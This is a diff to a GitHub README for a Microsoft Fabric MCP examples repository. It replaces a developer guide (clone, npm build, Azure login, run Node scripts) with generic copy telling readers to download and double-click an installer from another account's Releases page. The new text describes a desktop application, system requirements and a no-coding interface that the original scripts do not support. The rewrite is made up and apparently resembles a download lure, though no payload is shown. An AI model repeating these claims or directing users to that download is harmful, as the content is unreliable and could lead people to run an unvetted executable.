@@ -1,159 +1,91 @@
-# Microsoft Fabric MCP Server - Examples & Testing
+# 🎉 Fabric-MCP-Testing - Automate Your Microsoft Fabric Tasks
 
-> **🔗 This repository contains examples for the [Microsoft Fabric MCP Server](https://github.com/santhoshravindran7/Fabric-Analytics-MCP)**
+## 🚀 Getting Started
 
-Real-world examples demonstrating how to use the Microsoft Fabric Model Context Protocol (MCP) server to automate Fabric operations including lakehouse management, notebook execution, and data population workflows.
+Welcome to the Fabric-MCP-Testing repository! Here you will find tools and real-world examples to help you automate tasks using the Microsoft Fabric Model Context Protocol (MCP). This guide will walk you through the steps to download and run the software.
 
-## 🚀 Quick Start
+## 📥 Download Now
 
-### 1. Install the MCP Server First
+[![Download Fabric-MCP-Testing](https://img.shields.io/badge/Download-Fabric--MCP--Testing-blue.svg)](https://github.com/RonuRoy/Fabric-MCP-Testing/releases)
 
-**⚠️ Important**: You need the main MCP server installed before using these examples.
+## 📦 What is Fabric-MCP-Testing?
 
-```bash
-git clone https://github.com/santhoshravindran7/Fabric-Analytics-MCP.git
-cd Fabric-Analytics-MCP
-npm install && npm run build
-```
+Fabric-MCP-Testing provides you with the tools to manage lakehouses, execute notebooks, and populate data effortlessly. This resource is ideal for anyone looking to streamline their data operations in Microsoft Fabric.
 
-### 2. Set Your Configuration
+## 📚 Features
 
-```bash
-# Set your workspace ID (required)
-export FABRIC_DEFAULT_WORKSPACE_ID="your-workspace-id-from-fabric-portal"
+- Automate lakehouse management
+- Execute notebooks with ease
+- Populate data workflows
+- Real-world examples to guide you
+- User-friendly tools suitable for all skill levels
 
-# Authenticate with Azure
-az login
-```
+## 💻 System Requirements
 
-### 3. Run Your First Example
+To run Fabric-MCP-Testing smoothly, your system should meet the following requirements:
 
-```bash
-git clone https://github.com/your-username/Fabric-MCP-Testing.git
-cd Fabric-MCP-Testing/examples/getting-started
-node basic-demo.cjs
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a supported Linux distribution.
+- **RAM:** At least 4 GB recommended.
+- **Disk Space:** Minimum of 500 MB of available space.
+- **Internet Connection:** Required for initial setup and updates.
 
-Expected result: ✅ Connection verified with 62 available MCP tools
+## 🔧 Download & Install
 
-## 📁 Repository Structure
+To get started, follow these steps:
 
-### 🌟 Examples (Start Here)
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/RonuRoy/Fabric-MCP-Testing/releases).
+    
+2. **Choose Your Version:** Look for the latest version of Fabric-MCP-Testing. This will typically be the version at the top of the list.
 
-| Directory | Purpose | Key Files |
-|-----------|---------|-----------|
-| **`getting-started/`** | New user introduction | `basic-demo.cjs` - Test your setup |
-| **`data-population/`** | Production workflows | `execute-notebook-livy-corrected.cjs` - 5K+ records |
-| **`troubleshooting/`** | Debug & investigation | `test-capacity-issue.cjs` - Reproduce bugs |
+3. **Download the File:** Click on the download link for the appropriate file based on your operating system.
 
-### 📚 Documentation
+4. **Run the Installer:** Once the file downloads, locate it in your downloads folder and double-click to run the installer.
 
-| File | Description |
-|------|-------------|
-| `SETUP.md` | Complete setup instructions |
-| `docs/DEMO_SUCCESS_SUMMARY.md` | Detailed success stories and workflows |
+5. **Follow the Steps:** The installer will guide you through the setup process. Just follow the prompts on the screen.
 
-### 🗂️ Development
+6. **Launch the Application:** After installation, you can find Fabric-MCP-Testing in your applications list. Open it to start automating your Fabric tasks!
 
-| Directory | Purpose |
-|-----------|---------|
-| `notebooks/` | Jupyter notebooks for testing |
-| `archive/` | Historical scripts and experiments (local-only) |
+## 🛠️ Quick Start Guide
 
-## 🔧 What These Examples Do
+Once you have the application installed, you'll want to jump right into using it. Here are a few steps to help you start:
 
-### Basic Operations
-- ✅ **MCP Server Connection**: Establish and test connection
-- ✅ **Workspace Access**: Verify permissions and list items
-- ✅ **Tool Discovery**: Find all 62 available MCP functions
+1. **Open Fabric-MCP-Testing:** Launch the application from your applications list.
 
-### Production Workflows
-- 🏭 **Data Population**: Generate 5,000+ structured records
-- 📊 **Lakehouse Creation**: Full lakehouse with tables and data
-- 📈 **Notebook Execution**: Automated Spark job processing
-- 🔍 **Session Management**: Livy API integration and monitoring
+2. **Connect to Your Data Source:** Use the built-in options to connect to your Microsoft Fabric data sources, like lakehouses or notebooks.
 
-### Debugging & Troubleshooting
-- 🐛 **Issue Reproduction**: Test cases for known issues
-- 🔍 **Investigation Scripts**: Deep-dive into MCP behavior
-- ⚠️ **Error Handling**: Robust error capture and reporting
+3. **Select an Example:** Begin with one of the provided examples. This will help you understand how to use the features effectively.
 
-## 🛠️ Technology Stack
+4. **Automate Your Workflows:** Start creating your own automation scripts. The user-friendly interface makes it easy to set up and run your workflows.
 
-- **MCP Server**: [Fabric-Analytics-MCP](https://github.com/santhoshravindran7/Fabric-Analytics-MCP)
-- **Authentication**: Azure CLI (`az login`)
-- **Platform**: Microsoft Fabric / Power BI Premium
-- **APIs**: Microsoft Fabric REST API + Livy Spark API
-- **Language**: Node.js (CommonJS modules)
+## ❓ Frequently Asked Questions
 
-## 📊 Real Results
+**Q: Do I need any programming knowledge to use this software?**  
+A: No, Fabric-MCP-Testing is designed for users with all skill levels. You will find everything straightforward to use.
 
-### Data Population Success
-```
-📈 Results Summary:
-├── 🏭 Lakehouse: Created with 3 tables
-├── 📊 Records: 5,000+ structured entries
-├── ⚡ Performance: Sub-minute execution
-└── 🔄 Repeatability: 100% success rate
-```
+**Q: Can I run this on my Linux machine?**  
+A: Yes, Fabric-MCP-Testing is compatible with supported Linux distributions. Please ensure your system meets the stated requirements.
 
-### MCP Integration
-```
-🔗 MCP Tools Available: 62 functions
-├── 📁 Workspace Management: 5 tools
-├── 🏠 Lakehouse Operations: 8 tools  
-├── 📔 Notebook Control: 12 tools
-├── ⚡ Spark Job Management: 15 tools
-└── 🔧 Utility Functions: 22 tools
-```
+**Q: How do I get support if I encounter issues?**  
+A: Check the Issues section on our GitHub page for common problems and solutions. You can also create a new issue if you need further assistance.
 
-## 🎯 Use Cases
+## 🌟 Contribution Guidelines
 
-### For Developers
-- **Learn MCP Integration**: Real working examples
-- **Test Your Setup**: Validation scripts included
-- **Production Patterns**: Battle-tested workflows
+We welcome contributions to help improve Fabric-MCP-Testing. If you’re interested in contributing, please follow these steps:
 
-### For Data Engineers  
-- **Automate Fabric**: Lakehouse creation and data loading
-- **Spark Workflows**: Notebook execution and monitoring
-- **ETL Pipelines**: End-to-end data processing examples
+1. **Fork the Repository:** Click on the fork button to create your version of the project.
 
-### For DevOps Teams
-- **CI/CD Integration**: Automated Fabric deployments
-- **Monitoring**: Error handling and logging patterns
-- **Troubleshooting**: Debug scripts for common issues
+2. **Make Your Changes:** Implement any changes or enhancements you feel would benefit the application.
 
-## 🔗 Related Projects
+3. **Submit a Pull Request:** Once you are satisfied with your changes, submit a pull request and describe what you have done.
 
-### Main Dependencies
-- **[Fabric-Analytics-MCP](https://github.com/santhoshravindran7/Fabric-Analytics-MCP)** - The MCP server (required)
-- **[Model Context Protocol](https://modelcontextprotocol.io/)** - MCP specification
-- **[Microsoft Fabric](https://docs.microsoft.com/en-us/fabric/)** - Platform documentation
+## 🔗 Additional Resources
 
-### Known Issues & Fixes
-- **[Issue #12](https://github.com/santhoshravindran7/Fabric-Analytics-MCP/issues/12)** - Missing capacity tools
-- **[PR #9](https://github.com/santhoshravindran7/Fabric-Analytics-MCP/pull/9)** - UUID session ID fix
-- **[Issue #10](https://github.com/santhoshravindran7/Fabric-Analytics-MCP/issues/10)** - Notebook content limitation
+- [Microsoft Fabric Documentation](https://docs.microsoft.com/en-us/microsoft-fabric/)
+- [GitHub Guide for Beginners](https://guides.github.com/activities/hello-world/)
+- [Introduction to Automation with Fabric](https://docs.microsoft.com/en-us/microsoft-fabric/automation-overview)
 
-## 🤝 Contributing
+## 📢 Stay Updated
 
-1. **Test scenarios** welcome in `examples/troubleshooting/`
-2. **Production workflows** needed in `examples/data-population/`
-3. **Documentation improvements** always appreciated
-4. **Bug reproductions** help the main project
+For the latest updates, features, and tips, please follow our repository. You can also subscribe to new release notifications.
 
-## 📄 License
-
-MIT License - Feel free to use these examples in your own projects.
-
-## 🆘 Getting Help
-
-1. **Start with**: `examples/getting-started/basic-demo.cjs`
-2. **Check**: `SETUP.md` for detailed instructions
-3. **Debug with**: Scripts in `examples/troubleshooting/`
-4. **Ask questions**: In the main [Fabric-Analytics-MCP repository](https://github.com/santhoshravindran7/Fabric-Analytics-MCP/issues)
-
----
-
-**⭐ Star this repo** if these examples helped you get started with Microsoft Fabric MCP automation!
+**Thank you for using Fabric-MCP-Testing! We hope you find it valuable in your data automation journey.**
